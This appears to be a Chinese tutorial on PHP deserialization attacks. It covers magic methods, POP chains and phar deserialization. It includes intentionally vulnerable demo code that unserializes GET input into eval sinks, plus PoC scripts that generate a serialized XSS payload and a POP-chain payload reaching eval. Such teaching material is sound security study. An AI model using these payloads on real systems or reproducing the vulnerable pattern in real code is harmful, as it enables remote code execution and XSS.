1.概念


在实战中经常遇到的反序列漏洞，比如fastjson、shiro、thinkphp反序列化，导致这些漏洞根本原因就是程序在对字节转换成对象时未进行过滤，攻击者通过构造恶意的payload让程序进行反序列化，通过对象内的魔术方法触发。


2.函数


相关函数

  • serialize()

  • unserialize()


serialize()：serialize()返回字符串，此字符串包含了表示value的字节流，可以存储于任何地方。这有利于存储或传递PHP的值，同时不丢失其类型和结构。

unserialize()：unserialize()对单一的已序列化的变量进行操作，将其转换后PHP的值。


下面是代码示例：

demo.php

<?phpclass Person{    public $name="小明";    public function say() {        echo $this->name;    }}$u = unserialize($_GET['test']);$u->say();?>


这里有两个文件，先看demo.php文件，定义了一个Person类，然后类下面一个say方法，输出定义的name变量，面向对象中定义的类函数是不会自动触发的，要通过new创建对象的方式调用类中的函数。第8行这里使用了unserialize函数，get请求test参数传输过来，然后u再调用say函数。


那么这里通过get传参恶意payload，也就是序列化过的内容，让unserialize转换成一个对象赋值给u，这样就可以通过u调用say函数输出name。


demo_poc.php

<?phpclass Person{}$p = new Person();$s = serialize($p);echo $s;?>


demo_poc.php构建一个Person类，然后new对象赋值给p序列化后输出，就可以拿到序列化后的字符串，也就是O:6:"Person":0:{}


这里的name变量可以输出到网页，那么这里就可以在序列化的时候重新给name变量赋值，构造一个xss。


<?phpclass Person{    public $name = '<script>alert(1)</script>';}$p = new Person();$s = serialize($p);echo $s;?>


得到了我们序列化过的字符串


O:6:"Person":1:{s:4:"name";s:25:"<script>alert(1)</script>";}


这样我们就通过反序列化完成了一次xss攻击



这个案例里面的是通过get请求传参方式进行反序列化转换对象方式然后调用我们的say方法，还有一种方法就是通过魔术方法去触发，指定条件下自动触发反序列化。


3.魔术方法


魔术方法

基础讲解

__construct()

类的构造函数-实例化一个类之前先执行该方法

__destruct()

类的析构函数-在销毁一个类之前执行该方法

__call()

在对象中调用一个不可访问方法时调用

__callStatic()

在静态上下文中调用一个不可访问方法时调用

__get()

读取不可访问属性的值时调用

__set()

在给不可访问属性赋值时调用

__isset()

当对不可访问属性调用 isset() 或 empty() 时调用

__unset()

当对不可访问属性调用 unset() 时，__unset() 时调用

__sleep()

执行serialize()时，会先调用该魔术方法

__wakeup()

执行unserialize()时，会先调用该魔术方法

__toString()

当一个对象被当作字符串对待的时候，会触发这个魔术方法

__invoke()

当尝试以调用函数的方式调用一个对象时，__invoke() 方法会被自动调用

__set_state()

自 PHP 5.1.0 起当调用 var_export() 导出类时，此静态 方法会被调用

__clone()

当复制完成时，如果定义了 __clone() 方法，则新创建的对象（复制生成的对象）中的 __clone() 方法会被调用

__debugInfo()

执行var_dump()方法的时候会调用__debugInfo()方法。如果未在对象上定义该方法，则将显示所有公共，受保护和私有属性。PHP 5.6.0中添加了此功能。

__autoload()

它会在试图使用尚未被定义的类时自动调用。

通过调用此函数，脚本引擎在 PHP 出错失败前有了最后一个机会加载所需的类。

4.pop链


通俗点意思：反序列化的时候经常会出现关键代码不在某个魔术方法里面，而是在另外一个类的普通方法中。这个时候我们就可以通过查找相同的函数名将类的属性和敏感函数的属性联系起来，最后达到目的。


demo1：

<?phpclass Test{    protected $ClassObj;
    function __construct() {        $this->ClassObj = new A();    }    function __destruct() {        $this->ClassObj->action();    }}
class A{    function action() {        echo "我很安全";    }}
class B{    private $data;    function action() {        eval($this->data);    }}
unserialize($_GET['test']);?>


这里定义了3个类，Test、A类和B类，Test类里面又两个魔术方法，一个在New对象时触发，另外一个在程序类销毁时触发action方法，但是__construct方法new A类，销毁的时候触发action方法只输出我很安全，并且内容不可控。


但是在B类action方法里面有一个eval函数，并且调用了data变量，data变量是我们可以控制的，那么就可以通过构造pop链，让程序在反序列化时Test对象__construct new B对象，__destruct触发action方法时调用的就是B类中的同名方法。


poc如下：

<?phpclass Test{    protected $ClassObj;    function __construct(){        $this->ClassObj = new B();        // new B类    }}
class B{    private $data = "phpinfo();";    // 覆盖data变量}// 这里需要url编码一下echo urlencode(serialize(new Test()));
?>

执行结果


demo2：

<?phpclass Test{    public $class_name = 'A';    public $test = '安全';    public function __wakeup() {        new $this->class_name($this->test);    }}class A{    function __construct($value){        echo $value . '很安全';    }}class B{    function __construct($value){        eval($value);    }}unserialize($_GET['test']);?>


和demo1一样定义了三个类，Test类中__wakeup方法new A类，A类是安全的，B类__construct方法传值$value给eval，因为Test类在New对象时通过$this->test，那么就可以通过修改classs_name和test触发B类中的eval函数。

6.phar反序列化


Phar 反序列化是一种相对较新的向量，用于对面向对象的 PHP 应用程序执行代码重用攻击，安全研究员 Sam Thomas 在 Black Hat 2018上公开披露了它。类似于对已编译二进制文件的 ROP（面向返回编程）攻击，这种类型的利用是通过 PHP 对象注入 (POI) 进行的，这是面向对象的 PHP 代码上下文中的一种面向属性的编程 (POP) 形式。

由于其新颖性，这种攻击向量在过去几个月中越来越受到安全社区的关注，导致在许多广泛部署的平台中发现了远程代码执行漏洞，例如：

  • WordPress < 5.0.1 ( CVE-2018-20148 )

  • Drupal 8.6.x、8.5.x、7.x ( CVE-2019-6339 )

  • Prestashop 1.6.x、1.7.x ( CVE-2018-19126 )

  • TCPDF < 6.2.19 ( CVE-2018-17057 )

  • PhpBB 3.2.3 ( CVE-2018-19274 )

phar文件结构

  • stub phar 文件标识，格式为 xxx<?php xxx; __HALT_COMPILER();?>；

  • manifest 压缩文件的属性等信息，以序列化存储；

  • contents 压缩文件的内容；

  • signature 签名，放在文件末尾；


利用条件

  • 可以上传phar文件或经过伪造的phar文件

  • 需要__wakeup()、__destruct()魔术方法触发
